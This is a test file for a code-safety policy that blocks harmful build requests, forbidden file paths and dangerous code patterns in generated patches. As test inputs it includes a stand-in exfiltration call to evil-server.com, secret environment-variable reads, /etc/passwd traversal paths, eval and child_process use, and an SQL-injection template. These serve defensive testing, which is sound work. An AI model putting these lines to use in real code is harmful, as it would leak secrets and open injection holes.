/**
 * Tests for safety-policy.ts — the most important defense layer.
 * Pure functions, no mocks needed.
 */
import { describe, it, expect } from 'vitest'
import { checkIntent, checkPath, checkContent, evaluate } from '../services/safety-policy.js'

describe('safety-policy: intent denylist', () => {
  it('blocks hacking intent', () => {
    expect(checkIntent('Bank hacking system', 'Steal credentials').ok).toBe(false)
  })
  it('blocks phishing', () => {
    expect(checkIntent('Phishing email generator', '').ok).toBe(false)
  })
  it('blocks malware', () => {
    expect(checkIntent('Ransomware module', '').ok).toBe(false)
  })
  it('blocks weapons', () => {
    expect(checkIntent('Weapon control firmware', '').ok).toBe(false)
  })
  it('blocks deepfake', () => {
    expect(checkIntent('Deepfake face swap tool', '').ok).toBe(false)
  })
  it('blocks auth bypass', () => {
    expect(checkIntent('Bypass auth on the dashboard', '').ok).toBe(false)
  })
  it('blocks money laundering', () => {
    expect(checkIntent('Money laundering scheme', '').ok).toBe(false)
  })
  it('blocks data theft', () => {
    expect(checkIntent('Exfiltrate credentials from logs', '').ok).toBe(false)
  })

  it('ALLOWS legitimate builds', () => {
    expect(checkIntent('Social media post scheduler', 'Schedule posts to Twitter/X').ok).toBe(true)
    expect(checkIntent('AI image generator', 'Generate marketing images').ok).toBe(true)
    expect(checkIntent('Customer feedback dashboard', 'Track NPS').ok).toBe(true)
    expect(checkIntent('Inventory tracking', 'Track stock levels').ok).toBe(true)
    expect(checkIntent('Revenue forecasting', 'Predict next quarter').ok).toBe(true)
    expect(checkIntent('Workflow scheduler', 'Run jobs on cron').ok).toBe(true)
  })
})

describe('safety-policy: path policy', () => {
  it('allows creating new service files', () => {
    expect(checkPath('apps/api/src/services/social-poster.ts', 'create').ok).toBe(true)
  })
  it('allows creating new route files', () => {
    expect(checkPath('apps/api/src/routes/social.ts', 'create').ok).toBe(true)
  })
  it('allows creating new pages', () => {
    expect(checkPath('apps/web/src/pages/SocialPosterPage.tsx', 'create').ok).toBe(true)
  })
  it('allows creating new migrations', () => {
    expect(checkPath('packages/db/migrations/0020_social.sql', 'create').ok).toBe(true)
  })

  it('rejects forbidden auth paths', () => {
    expect(checkPath('apps/api/src/plugins/auth.ts', 'modify').ok).toBe(false)
    expect(checkPath('apps/api/src/services/secrets-vault.ts', 'modify').ok).toBe(false)
    expect(checkPath('apps/api/src/services/billing.ts', 'modify').ok).toBe(false)
  })
  it('rejects .env paths', () => {
    expect(checkPath('.env', 'create').ok).toBe(false)
    expect(checkPath('apps/api/.env.local', 'create').ok).toBe(false)
  })
  it('rejects Dockerfile / compose / package.json', () => {
    expect(checkPath('Dockerfile', 'modify').ok).toBe(false)
    expect(checkPath('docker-compose.local.yml', 'modify').ok).toBe(false)
    expect(checkPath('package.json', 'modify').ok).toBe(false)
    expect(checkPath('pnpm-lock.yaml', 'modify').ok).toBe(false)
  })
  it('rejects path traversal', () => {
    expect(checkPath('../etc/passwd', 'create').ok).toBe(false)
    expect(checkPath('apps/api/../../etc/x', 'create').ok).toBe(false)
  })
  it('rejects absolute paths', () => {
    expect(checkPath('/etc/passwd', 'create').ok).toBe(false)
  })
  it('rejects modifying random files', () => {
    expect(checkPath('apps/api/src/services/economic-intelligence.ts', 'modify').ok).toBe(false)
  })
  it('only allows modify on the 3-file allowlist', () => {
    expect(checkPath('apps/api/src/server.ts', 'modify').ok).toBe(true)
    expect(checkPath('apps/web/src/App.tsx', 'modify').ok).toBe(true)
    expect(checkPath('packages/db/src/schema.ts', 'modify').ok).toBe(true)
  })
})

describe('safety-policy: content scanner', () => {
  it('blocks eval', () => {
    expect(checkContent('x.ts', 'const x = eval("1+1")').ok).toBe(false)
  })
  it('blocks child_process', () => {
    expect(checkContent('x.ts', "import { exec } from 'child_process'").ok).toBe(false)
  })
  it('blocks new Function', () => {
    expect(checkContent('x.ts', 'const f = new Function("x", "return x")').ok).toBe(false)
  })
  it('blocks process.exit', () => {
    expect(checkContent('x.ts', 'process.exit(0)').ok).toBe(false)
  })
  it('blocks secret env access', () => {
    expect(checkContent('x.ts', 'const k = process.env.AUTH_SECRET').ok).toBe(false)
    expect(checkContent('x.ts', 'const k = process.env.STRIPE_SECRET').ok).toBe(false)
  })
  it('blocks external HTTP to non-allowlist', () => {
    expect(checkContent('x.ts', "await fetch('https://evil-server.com/exfil')").ok).toBe(false)
  })
  it('allows external HTTP to allowlisted hosts', () => {
    expect(checkContent('x.ts', "await fetch('https://api.groq.com/openai/v1/chat/completions')").ok).toBe(true)
    expect(checkContent('x.ts', "await fetch('https://api.openai.com/v1/embeddings')").ok).toBe(true)
  })
  it('blocks new auth/payment function definitions', () => {
    expect(checkContent('x.ts', 'export async function authenticate(u, p) { return true }').ok).toBe(false)
    expect(checkContent('x.ts', 'export function chargeCard(card) { /* ... */ }').ok).toBe(false)
  })
  it('blocks unsanitized SQL templating with req params', () => {
    expect(checkContent('x.ts', 'await db.execute(sql`SELECT * FROM users WHERE id = ${req.query.id}`)').ok).toBe(false)
  })
  it('blocks size > 30k', () => {
    const huge = 'x'.repeat(31_000)
    expect(checkContent('x.ts', huge).ok).toBe(false)
  })
  it('blocks > 800 lines', () => {
    const tall = Array(900).fill('// line').join('\n')
    expect(checkContent('x.ts', tall).ok).toBe(false)
  })
  it('allows benign legitimate code', () => {
    const ok = `import { db } from '../db/client.js'
export async function recentPosts(workspaceId: string) {
  return db.select().from(posts).where(eq(posts.workspaceId, workspaceId))
}`
    expect(checkContent('x.ts', ok).ok).toBe(true)
  })
})

describe('safety-policy: aggregate evaluate()', () => {
  it('blocks the hostile example end-to-end', () => {
    const r = evaluate({
      title: 'Hack bank accounts',
      summary: 'Brute force passwords and exfiltrate funds',
      files: [
        { path: 'apps/api/src/services/hack.ts', op: 'create', contents: 'eval("steal()")' },
      ],
    })
    expect(r.ok).toBe(false)
    expect(r.blockedReasons.length).toBeGreaterThanOrEqual(2)
  })

  it('passes the legitimate example end-to-end', () => {
    const r = evaluate({
      title: 'Social media post scheduler',
      summary: 'Schedule posts to X/LinkedIn at chosen times',
      files: [
        { path: 'apps/api/src/services/social-scheduler.ts', op: 'create',
          contents: `import { db } from '../db/client.js'
export async function schedulePost(workspaceId: string, body: string, at: number) {
  return db.insert(scheduledPosts).values({ workspaceId, body, at })
}` },
      ],
    })
    expect(r.ok).toBe(true)
    expect(r.blockedReasons.length).toBe(0)
  })

  it('caps total files per patch at 12', () => {
    const files = Array.from({ length: 15 }, (_, i) => ({
      path: `apps/api/src/services/svc${i}.ts`, op: 'create' as const, contents: '// stub',
    }))
    const r = evaluate({ title: 'Many things', summary: '', files })
    expect(r.ok).toBe(false)
    expect(r.blockedReasons.some(x => x.includes('too many files'))).toBe(true)
  })
})
